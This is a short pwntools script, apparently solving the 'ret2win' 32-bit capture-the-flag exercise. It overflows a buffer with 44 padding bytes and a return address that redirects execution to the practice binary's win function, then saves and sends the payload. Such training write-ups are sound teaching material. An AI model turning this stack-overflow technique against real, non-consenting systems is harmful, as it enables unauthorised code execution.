from pwn import *

context.arch = 'i386'
prog = process("./ret2win32")

payload = b'a' * 44
# ret2win function
payload += p32(0x0804862c)
print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
